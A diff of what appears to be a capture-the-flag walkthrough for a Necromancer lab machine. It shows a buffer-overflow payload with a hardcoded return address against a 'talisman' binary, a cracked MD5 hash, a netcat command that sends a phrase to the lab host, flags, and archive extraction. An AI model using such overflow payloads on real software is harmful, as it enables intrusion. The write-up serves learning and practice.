@@ -627,22 +627,6 @@ Do you want to wear the talisman?  tada
 
 Nothing happens.
 
-  </code>
-</pre>
-
-With the Spell we found.
-
-<pre>
-  <code class="bash">
-  ./talisman
-You have found a talisman.
-
-The talisman is cold to the touch, and has no words or symbols on it's surface.
-
-Do you want to wear the talisman?  tada
-
-Nothing happens.
-
 python -c ‘print “A”*32’ | ./talisman
 You have found a talisman.
 
@@ -653,6 +637,15 @@ Do you want to wear the talisman?
 Nothing happens.
 
 Segmentation fault
+
+  </code>
+</pre>
+
+With the Spell we found.
+
+<pre>
+  <code class="bash">
+
 
 python -c 'print "A"*32 + "\x37\x8a\x04\x08"' | ./talisman
 You have found a talisman.
@@ -679,3 +672,99 @@ Segmentation fault
 </pre>
 
 Yeah, flag4.
+
+ea50536158db50247e110a6c89fcf3d3 = blackmagic
+
+Lets do what we there told:
+
+<pre>
+  <code class="bash">
+  echo blackmagic | nc -u 192.168.99.100 31337
+
+
+As you chant the words, a hissing sound echoes from the ice walls.
+
+The blue aura disappears from the cave entrance.
+
+You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.
+
+You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.
+
+The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.
+
+Suddenly, you are attacked by a swarm of bats!
+
+You aimlessly thrash at the air in front of you!
+
+The bats continue their relentless attack, until.... silence.
+
+Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.
+
+Looking towards one of the torches, you see something on the cave wall.
+
+You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.
+
+/thenecromancerwillabsorbyoursoul
+
+flag5{0766c36577af58e15545f099a3b15e60}
+
+
+  </code>
+</pre>
+
+Yeah, Flag5.
+
+Going to http://192.168.99.100//thenecromancerwillabsorbyoursoul/ revealed flag6.
+
+<img src="images/necromancer/thenecromancerwillabsorbyoursoul.png" class="fit image">
+
+pre>
+  <code class="bash">
+  Again he stares at you with deathly hollow eyes.
+
+He is standing in a doorway; a staff in one hand, and an object in the other.
+
+Smirking, the necromancer holds the staff and the object in the air.
+
+He points his staff in your direction, and the stench of death and decay begins to fill the air.
+
+You stare into his eyes and then.......
+
+
+
+
+
+
+
+
+...... darkness. You open your eyes and find yourself lying on the damp floor of the cave.
+
+The amulet must have saved you from whatever spell the necromancer had cast.
+
+You stand to your feet. Behind you, only darkness.
+
+Before you, a large door with the symbol of a skull engraved into the surface.
+
+Looking closer at the skull, you can see u161 engraved into the forehead.
+  </code>
+
+
+Following the link http://192.168.99.100//thenecromancerwillabsorbyoursoul/necromancer we got the necromancer.
+
+Let's look what we got.
+
+
+<pre>
+  <code class="bash">
+  file necromancer
+  necromancer: bzip2 compressed data, block size = 900k
+  bzip2 -d necromancer
+  bzip2: Can't guess original name for necromancer -- using necromancer.out
+  file necromancer.out
+  necromancer.out: POSIX tar archive (GNU)
+  tar xfv necromancer.out
+  necromancer.cap
+  </code>
+</pre>
+
+<img src="images/necromancer/wire2.png" class="fit image">
